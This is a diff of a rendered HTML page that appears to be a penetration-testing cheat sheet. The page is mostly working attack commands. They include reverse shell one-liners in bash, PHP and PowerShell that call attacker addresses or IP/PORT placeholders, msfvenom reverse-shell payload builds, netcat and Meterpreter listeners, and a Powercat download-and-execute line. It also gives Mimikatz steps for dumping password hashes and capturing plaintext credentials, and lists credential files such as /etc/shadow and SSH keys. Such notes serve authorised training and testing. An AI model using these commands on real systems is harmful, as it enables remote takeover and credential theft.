+</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/IP/PORT<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a><span class="c1"># Bash (URL encoded)</span>
+</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a><span class="c1"># Bash, in case of sh</span>
+</span><span id="__span-58-12"><a id="__codelineno-58-12" name="__codelineno-58-12" href="#__codelineno-58-12"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1"</span>
+</span><span id="__span-58-13"><a id="__codelineno-58-13" name="__codelineno-58-13" href="#__codelineno-58-13"></a><span class="c1"># PHP</span>
+</span><span id="__span-58-14"><a id="__codelineno-58-14" name="__codelineno-58-14" href="#__codelineno-58-14"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">'$sock=fsockopen("IP",PORT);exec("/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</span><span id="__span-58-15"><a id="__codelineno-58-15" name="__codelineno-58-15" href="#__codelineno-58-15"></a><span class="c1"># Powershell one liner</span>
+</span><span id="__span-58-16"><a id="__codelineno-58-16" name="__codelineno-58-16" href="#__codelineno-58-16"></a><span class="c1"># https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 </span>
+</span><span id="__span-58-17"><a id="__codelineno-58-17" name="__codelineno-58-17" href="#__codelineno-58-17"></a><span class="c1"># in base of Base64, make sure to encode as UTF16 first</span>
+</span><span id="__span-58-18"><a id="__codelineno-58-18" name="__codelineno-58-18" href="#__codelineno-58-18"></a><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.10.10'</span>,80<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">$bytes</span>.Length<span class="o">))</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="o">){</span><span class="p">;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>-TypeName<span class="w"> </span>System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0,<span class="w"> </span><span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>iex<span class="w"> </span><span class="s2">". { </span><span class="nv">$data</span><span class="s2"> } 2&gt;&amp;1"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-String<span class="w"> </span><span class="o">)</span><span class="p">;</span><span class="w"> </span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span>+<span class="w"> </span><span class="s1">'PS '</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path<span class="w"> </span>+<span class="w"> </span><span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
+</span><span id="__span-58-19"><a id="__codelineno-58-19" name="__codelineno-58-19" href="#__codelineno-58-19"></a>
+</span><span id="__span-58-20"><a id="__codelineno-58-20" name="__codelineno-58-20" href="#__codelineno-58-20"></a><span class="c1"># Python file hosting</span>
+</span><span id="__span-58-21"><a id="__codelineno-58-21" name="__codelineno-58-21" href="#__codelineno-58-21"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-58-22"><a id="__codelineno-58-22" name="__codelineno-58-22" href="#__codelineno-58-22"></a>
+</span><span id="__span-58-23"><a id="__codelineno-58-23" name="__codelineno-58-23" href="#__codelineno-58-23"></a><span class="c1"># Create payloads with msfvenom</span>
+</span><span id="__span-58-24"><a id="__codelineno-58-24" name="__codelineno-58-24" href="#__codelineno-58-24"></a><span class="c1"># .exe 64-bit, stageless</span>
+</span><span id="__span-58-25"><a id="__codelineno-58-25" name="__codelineno-58-25" href="#__codelineno-58-25"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>reverse.exe
+</span><span id="__span-58-26"><a id="__codelineno-58-26" name="__codelineno-58-26" href="#__codelineno-58-26"></a><span class="c1"># .exe 32-bit, stageless</span>
+</span><span id="__span-58-27"><a id="__codelineno-58-27" name="__codelineno-58-27" href="#__codelineno-58-27"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>reverse.exe
+</span><span id="__span-58-28"><a id="__codelineno-58-28" name="__codelineno-58-28" href="#__codelineno-58-28"></a><span class="c1"># .elf, stageless</span>
+</span><span id="__span-58-29"><a id="__codelineno-58-29" name="__codelineno-58-29" href="#__codelineno-58-29"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>shell
+</span><span id="__span-58-30"><a id="__codelineno-58-30" name="__codelineno-58-30" href="#__codelineno-58-30"></a><span class="c1"># PHP</span>
+</span><span id="__span-58-31"><a id="__codelineno-58-31" name="__codelineno-58-31" href="#__codelineno-58-31"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>php/meterpreter/reverse_tcp<span class="w"> </span>-f<span class="w"> </span>raw<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>PORT<span class="w"> </span>&gt;<span class="w"> </span>pwn.php
 </span></code></pre></div>
 <h4 id="listeners">Listeners<a class="headerlink" href="#listeners" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1"># Netcat listener</span>
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">4444</span>
-</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
-</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1"># Meterpreter listener</span>
-</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>msfconsole<span class="w"> </span>-x<span class="w"> </span><span class="s2">"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"</span>
-</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>
-</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="c1"># Powercat listener script (Kali) and command to execute</span>
-</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a>cp<span class="w"> </span>/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1<span class="w"> </span>.
-</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">"http://IP/powercat.ps1"</span><span class="o">)</span><span class="p">;</span>powercat<span class="w"> </span>-c<span class="w"> </span>IP<span class="w"> </span>-p<span class="w"> </span>PORT<span class="w"> </span>-e<span class="w"> </span>powershell<span class="w"> </span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="c1"># Netcat listener</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>nc<span class="w"> </span>-nvlp<span class="w"> </span>PORT
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>
+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="c1"># Meterpreter listener</span>
+</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>msfconsole<span class="w"> </span>-x<span class="w"> </span><span class="s2">"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST IP;set LPORT PORT;run;"</span>
+</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>
+</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="c1"># Powercat listener script (Kali) and command to execute</span>
+</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a>cp<span class="w"> </span>/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1<span class="w"> </span>.
+</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a>IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">"http://IP/powercat.ps1"</span><span class="o">)</span><span class="p">;</span>powercat<span class="w"> </span>-c<span class="w"> </span>IP<span class="w"> </span>-p<span class="w"> </span>PORT<span class="w"> </span>-e<span class="w"> </span>powershell<span class="w"> </span>
 </span></code></pre></div>
 <h4 id="upgrade-shell">Upgrade shell<a class="headerlink" href="#upgrade-shell" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="c1"># Upgrade shell with Python</span>
-</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
-</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
-</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="c1"># Fix on local side to make proper TTY</span>
-</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>Ctrl<span class="w"> </span>+<span class="w"> </span>Z
-</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
-</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a>Enter
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="c1"># Upgrade shell with Python</span>
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="c1"># Fix on local side to make proper TTY</span>
+</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>Ctrl<span class="w"> </span>+<span class="w"> </span>Z
+</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a>Enter
 </span></code></pre></div>
 <h3 id="windows-authentication">Windows Authentication<a class="headerlink" href="#windows-authentication" title="Permanent link">¶</a></h3>
 <h4 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="c1"># Run Mimikatz in elevated PowerShell window</span>
-</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>.<span class="se">\m</span>imikatz.exe
-</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>
-</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="c1"># Enable SeDebugPrivilege for needed debug privs</span>
-</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>privilege::debug
-</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>
-</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a><span class="c1"># Elevate to SYSTEM privs</span>
-</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a>token::elevate
-</span><span id="__span-60-9"><a id="__codelineno-60-9" name="__codelineno-60-9" href="#__codelineno-60-9"></a>
-</span><span id="__span-60-10"><a id="__codelineno-60-10" name="__codelineno-60-10" href="#__codelineno-60-10"></a><span class="c1"># Dump passwords</span>
-</span><span id="__span-60-11"><a id="__codelineno-60-11" name="__codelineno-60-11" href="#__codelineno-60-11"></a><span class="c1"># Option 1 (local user): extract NThashes from SAM</span>
-</span><span id="__span-60-12"><a id="__codelineno-60-12" name="__codelineno-60-12" href="#__codelineno-60-12"></a>lsadump::sam
-</span><span id="__span-60-13"><a id="__codelineno-60-13" name="__codelineno-60-13" href="#__codelineno-60-13"></a><span class="c1"># Option 2 (domain user): extract NThashes from LSASS</span>
-</span><span id="__span-60-14"><a id="__codelineno-60-14" name="__codelineno-60-14" href="#__codelineno-60-14"></a>sekurlsa::logonpasswords
-</span><span id="__span-60-15"><a id="__codelineno-60-15" name="__codelineno-60-15" href="#__codelineno-60-15"></a>
-</span><span id="__span-60-16"><a id="__codelineno-60-16" name="__codelineno-60-16" href="#__codelineno-60-16"></a><span class="c1"># Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds</span>
-</span><span id="__span-60-17"><a id="__codelineno-60-17" name="__codelineno-60-17" href="#__codelineno-60-17"></a>misc::memssp
-</span><span id="__span-60-18"><a id="__codelineno-60-18" name="__codelineno-60-18" href="#__codelineno-60-18"></a><span class="c1"># Check output after auth request happened</span>
-</span><span id="__span-60-19"><a id="__codelineno-60-19" name="__codelineno-60-19" href="#__codelineno-60-19"></a><span class="nb">type</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\m</span>imilsa.log
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="c1"># Run Mimikatz in elevated PowerShell window</span>
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>.<span class="se">\m</span>imikatz.exe
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>
+</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a><span class="c1"># Enable SeDebugPrivilege for needed debug privs</span>
+</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>privilege::debug
+</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a>
+</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a><span class="c1"># Elevate to SYSTEM privs</span>
+</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a>token::elevate
+</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a>
+</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a><span class="c1"># Dump passwords</span>
+</span><span id="__span-61-11"><a id="__codelineno-61-11" name="__codelineno-61-11" href="#__codelineno-61-11"></a><span class="c1"># Option 1 (local user): extract NThashes from SAM</span>
+</span><span id="__span-61-12"><a id="__codelineno-61-12" name="__codelineno-61-12" href="#__codelineno-61-12"></a>lsadump::sam
+</span><span id="__span-61-13"><a id="__codelineno-61-13" name="__codelineno-61-13" href="#__codelineno-61-13"></a><span class="c1"># Option 2 (domain user): extract NThashes from LSASS</span>
+</span><span id="__span-61-14"><a id="__codelineno-61-14" name="__codelineno-61-14" href="#__codelineno-61-14"></a>sekurlsa::logonpasswords
+</span><span id="__span-61-15"><a id="__codelineno-61-15" name="__codelineno-61-15" href="#__codelineno-61-15"></a>
+</span><span id="__span-61-16"><a id="__codelineno-61-16" name="__codelineno-61-16" href="#__codelineno-61-16"></a><span class="c1"># Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds</span>
+</span><span id="__span-61-17"><a id="__codelineno-61-17" name="__codelineno-61-17" href="#__codelineno-61-17"></a>misc::memssp
+</span><span id="__span-61-18"><a id="__codelineno-61-18" name="__codelineno-61-18" href="#__codelineno-61-18"></a><span class="c1"># Check output after auth request happened</span>
+</span><span id="__span-61-19"><a id="__codelineno-61-19" name="__codelineno-61-19" href="#__codelineno-61-19"></a><span class="nb">type</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\m</span>imilsa.log
 </span></code></pre></div>
 <h3 id="misc">Misc.<a class="headerlink" href="#misc" title="Permanent link">¶</a></h3>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="c1"># Folders/files to look in</span>
-</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>/var/www/html/<span class="w"> </span>
-</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>/etc/passwd
-</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>/etc/shadow
-</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>/proc/self/environ
-</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a>/var/www/html/webdav/passwd.dav
-</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a>
-</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a><span class="c1"># SSH key handling</span>
-</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a>../.ssh/id_rsa
-</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a>chmod<span class="w"> </span><span class="m">400</span><span class="w"> </span>id_rsa
-</span><span id="__span-61-11"><a id="__codelineno-61-11" name="__codelineno-61-11" href="#__codelineno-61-11"></a>sudo<span class="w"> </span>-l
-</span><span id="__span-61-12"><a id="__codelineno-61-12" name="__codelineno-61-12" href="#__codelineno-61-12"></a>
-</span><span id="__span-61-13"><a id="__codelineno-61-13" name="__codelineno-61-13" href="#__codelineno-61-13"></a>
-</span><span id="__span-61-14"><a id="__codelineno-61-14" name="__codelineno-61-14" href="#__codelineno-61-14"></a>
-</span><span id="__span-61-15"><a id="__codelineno-61-15" name="__codelineno-61-15" href="#__codelineno-61-15"></a><span class="c1"># Directory traversal Windows</span>
-</span><span id="__span-61-16"><a id="__codelineno-61-16" name="__codelineno-61-16" href="#__codelineno-61-16"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
-</span><span id="__span-61-17"><a id="__codelineno-61-17" name="__codelineno-61-17" href="#__codelineno-61-17"></a><span class="c1"># IIS web server files/folders</span>
-</span><span id="__span-61-18"><a id="__codelineno-61-18" name="__codelineno-61-18" href="#__codelineno-61-18"></a>C:<span class="se">\i</span>netpub<span class="se">\l</span>ogs<span class="se">\L</span>ogFiles<span class="se">\W</span>3SVC1<span class="se">\</span>
-</span><span id="__span-61-19"><a id="__codelineno-61-19" name="__codelineno-61-19" href="#__codelineno-61-19"></a>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>eb.config
-</span><span id="__span-61-20"><a id="__codelineno-61-20" name="__codelineno-61-20" href="#__codelineno-61-20"></a><span class="c1"># XAMPP PHP</span>
-</span><span id="__span-61-21"><a id="__codelineno-61-21" name="__codelineno-61-21" href="#__codelineno-61-21"></a>C:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\l</span>ogs
-</span><span id="__span-61-22"><a id="__codelineno-61-22" name="__codelineno-61-22" href="#__codelineno-61-22"></a>
-</span><span id="__span-61-23"><a id="__codelineno-61-23" name="__codelineno-61-23" href="#__codelineno-61-23"></a><span class="c1"># Decode Base64</span>
-</span><span id="__span-61-24"><a id="__codelineno-61-24" name="__codelineno-61-24" href="#__codelineno-61-24"></a><span class="nb">echo</span><span class="w"> </span>&lt;base64&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
-</span><span id="__span-61-25"><a id="__codelineno-61-25" name="__codelineno-61-25" href="#__codelineno-61-25"></a><span class="c1"># Inspect file in binary</span>
-</span><span id="__span-61-26"><a id="__codelineno-61-26" name="__codelineno-61-26" href="#__codelineno-61-26"></a>xxd<span class="w"> </span>-b<span class="w"> </span>malware.txt
-</span><span id="__span-61-27"><a id="__codelineno-61-27" name="__codelineno-61-27" href="#__codelineno-61-27"></a>
-</span><span id="__span-61-28"><a id="__codelineno-61-28" name="__codelineno-61-28" href="#__codelineno-61-28"></a><span class="c1"># Test whether running in CMD or PS</span>
-</span><span id="__span-61-29"><a id="__codelineno-61-29" name="__codelineno-61-29" href="#__codelineno-61-29"></a><span class="o">(</span>dir<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span>*<span class="sb">`</span><span class="p">|</span><span class="nb">echo</span><span class="w"> </span>CMD<span class="o">)</span><span class="p">;&amp;</span>&lt;<span class="c1"># rem #&gt;echo PowerShell</span>
-</span><span id="__span-61-30"><a id="__codelineno-61-30" name="__codelineno-61-30" href="#__codelineno-61-30"></a>
-</span><span id="__span-61-31"><a id="__codelineno-61-31" name="__codelineno-61-31" href="#__codelineno-61-31"></a><span class="c1"># Exiftool, display duplicated and unknown tags</span>
-</span><span id="__span-61-32"><a id="__codelineno-61-32" name="__codelineno-61-32" href="#__codelineno-61-32"></a>exiftool<span class="w"> </span>-a<span class="w"> </span>-u<span class="w"> </span>document.pdf
-</span><span id="__span-61-33"><a id="__codelineno-61-33" name="__codelineno-61-33" href="#__codelineno-61-33"></a>
-</span><span id="__span-61-34"><a id="__codelineno-61-34" name="__codelineno-61-34" href="#__codelineno-61-34"></a><span class="c1"># Quickly scan files for content</span>
-</span><span id="__span-61-35"><a id="__codelineno-61-35" name="__codelineno-61-35" href="#__codelineno-61-35"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">"FILENAME_HINT"</span><span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-niH<span class="w"> </span><span class="s2">"TERM"</span><span class="w"> </span><span class="o">{}</span><span class="w"> </span>+
-</span><span id="__span-61-36"><a id="__codelineno-61-36" name="__codelineno-61-36" href="#__codelineno-61-36"></a>
-</span><span id="__span-61-37"><a id="__codelineno-61-37" name="__codelineno-61-37" href="#__codelineno-61-37"></a><span class="c1"># Python2 env</span>
-</span><span id="__span-61-38"><a id="__codelineno-61-38" name="__codelineno-61-38" href="#__codelineno-61-38"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>virtualenv<span class="w"> </span>python2<span class="w"> </span>python2-dev
-</span><span id="__span-61-39"><a id="__codelineno-61-39" name="__codelineno-61-39" href="#__codelineno-61-39"></a>curl<span class="w"> </span>https://bootstrap.pypa.io/pip/2.7/get-pip.py<span class="w"> </span>-o<span class="w"> </span>get-pip.py
-</span><span id="__span-61-40"><a id="__codelineno-61-40" name="__codelineno-61-40" href="#__codelineno-61-40"></a>sudo<span class="w"> </span>python2<span class="w"> </span>get-pip.py<span class="w">  </span>
-</span><span id="__span-61-41"><a id="__codelineno-61-41" name="__codelineno-61-41" href="#__codelineno-61-41"></a>pip2<span class="w"> </span>install<span class="w"> </span>virtualenv<span class="w">      </span>
-</span><span id="__span-61-42"><a id="__codelineno-61-42" name="__codelineno-61-42" href="#__codelineno-61-42"></a>python2<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>py2env<span class="w">  </span>
-</span><span id="__span-61-43"><a id="__codelineno-61-43" name="__codelineno-61-43" href="#__codelineno-61-43"></a><span class="nb">source</span><span class="w"> </span>py2env/bin/activate
-</span><span id="__span-61-44"><a id="__codelineno-61-44" name="__codelineno-61-44" href="#__codelineno-61-44"></a>python<span class="w"> </span>-V
-</span><span id="__span-61-45"><a id="__codelineno-61-45" name="__codelineno-61-45" href="#__codelineno-61-45"></a><span class="c1"># Install impacket for Pyhon2</span>
-</span><span id="__span-61-46"><a id="__codelineno-61-46" name="__codelineno-61-46" href="#__codelineno-61-46"></a>pip<span class="w"> </span>install<span class="w"> </span><span class="nv">impacket</span><span class="o">==</span><span class="m">0</span>.9.22
-</span><span id="__span-61-47"><a id="__codelineno-61-47" name="__codelineno-61-47" href="#__codelineno-61-47"></a><span class="c1"># Python3 env</span>
-</span><span id="__span-61-48"><a id="__codelineno-61-48" name="__codelineno-61-48" href="#__codelineno-61-48"></a>python3<span class="w"> </span>-m<span class="w"> </span>virtualenv<span class="w"> </span>py3env<span class="w">  </span>
-</span><span id="__span-61-49"><a id="__codelineno-61-49" name="__codelineno-61-49" href="#__codelineno-61-49"></a><span class="nb">source</span><span class="w"> </span>py3env/bin/activate
-</span><span id="__span-61-50"><a id="__codelineno-61-50" name="__codelineno-61-50" href="#__codelineno-61-50"></a>
-</span><span id="__span-61-51"><a id="__codelineno-61-51" name="__codelineno-61-51" href="#__codelineno-61-51"></a><span class="c1"># Open webdav folder, for example to host malicious .lnk file</span>
